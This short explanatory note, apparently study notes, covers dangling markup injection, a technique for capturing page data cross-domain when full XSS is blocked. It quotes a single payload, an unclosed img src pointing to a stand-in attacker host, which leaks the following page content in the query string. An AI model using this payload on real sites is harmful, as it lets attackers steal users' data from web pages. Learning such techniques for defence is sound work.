# What is dangling markup injection?
Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.


Suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:
`"><img src='//attacker-website.com?`

Note that the attacker's payload doesn't close the `src` attribute, which is left "dangling". 
When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute.
==Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string==. 
Any non-alphanumeric characters, including newlines, will be URL-encoded.

Any attribute that makes an external request can be used for dangling markup.
